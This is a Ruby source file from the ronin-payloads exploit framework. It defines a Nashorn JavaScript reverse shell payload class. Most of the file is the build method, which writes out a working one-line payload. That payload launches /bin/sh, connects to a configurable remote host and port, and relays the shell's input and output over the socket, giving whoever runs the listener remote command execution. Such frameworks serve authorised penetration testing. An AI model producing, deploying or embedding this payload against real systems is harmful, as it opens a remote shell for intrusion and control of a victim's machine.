# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2024 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require_relative '../../../nashorn_payload'
require_relative '../../../mixins/reverse_shell'

module Ronin
  module Payloads
    module JS
      module Nashorn
        #
        # A basic [Nashorn] JavaScript reverse shell.
        #
        # [Nashorn]: https://www.oracle.com/technical-resources/articles/java/jf14-nashorn.html
        #
        # @since 0.2.0
        #
        class ReverseShell < NashornPayload

          include Mixins::ReverseShell

          register 'js/nashorn/reverse_shell'

          description <<~DESC
            A basic Nashorn JavaScript reverse shell.
          DESC

          references [
            'https://gist.github.com/frohoff/8e7c2bf3737032a25051'
          ]

          #
          # Builds the [Nashorn] JavaScript reverse shell payload.
          #
          # [Nashorn]: https://www.oracle.com/technical-resources/articles/java/jf14-nashorn.html
          #
          def build
            @payload = %{var p=new java.lang.ProcessBuilder("/bin/sh").redirectErrorStream(true).start();var s=new java.net.Socket(#{host.dump},#{port});var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();}
          end

        end
      end
    end
  end
end
